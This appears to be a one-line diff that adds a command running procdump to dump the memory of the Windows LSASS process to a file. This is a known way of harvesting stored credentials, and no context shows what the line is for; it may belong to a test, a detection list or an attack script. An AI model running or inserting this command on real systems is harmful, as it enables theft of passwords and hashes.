@@ -1,0 +1,1 @@
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
